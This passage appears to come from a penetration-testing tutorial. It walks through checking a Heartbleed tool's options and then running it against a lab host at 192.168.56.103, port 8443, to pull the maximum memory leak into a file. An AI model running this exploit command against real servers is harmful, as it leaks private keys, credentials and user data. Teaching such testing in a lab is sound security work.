    3\. Then, we check the options of the program, as shown:


    **./heartbleed --help**


    ![](index-195_1.png)


    4\. We will try to exploit 192.168.56.103 on port 8443, obtaining the maximum
    leak and


    saving the output to a text file hb_test.txt: **./heartbleed -s 192.168.56.103
    -p 8443 -f hb_test.txt -t 1**


    ![](index-195_2.png)


